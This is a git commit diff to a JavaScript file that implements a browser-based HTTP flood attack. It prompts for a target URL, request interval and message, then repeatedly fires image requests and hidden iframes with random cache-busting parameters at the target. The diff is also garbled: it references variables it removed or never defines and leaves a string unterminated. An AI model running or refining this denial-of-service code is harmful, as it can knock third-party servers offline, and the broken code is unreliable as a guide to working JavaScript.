b5b0ec07f6e6848f230206ec7c4a06b658dea78c
ninja25538 <ninja25538@users.noreply.github.com>
2017-09-19 08:08:12 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,9 +1,18 @@
-var target = prompt("Url");
+var target = prompt("Image Url, add / to the end");
+var speed = prompt("Make request ever [blank] miliseconds");
+var msg = prompt("Message to HTTP server");
+
 function attack() {  
   var pic = new Image();
-  var rand = Math.floor(Math.random() * 9999999999999999999);
+  var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
+  var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
   pic.src = 'http://'+target+"/?r="+rand;
     
-    document.body.innerHTML+='<iframe src="'+target+"/?r="+rand+'" style="display:none;"></iframe>';
+    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>;
+  
+
+                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
+					img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);
+
 }
-setInterval(attack, 100);  
+setInterval(attack, speed);  
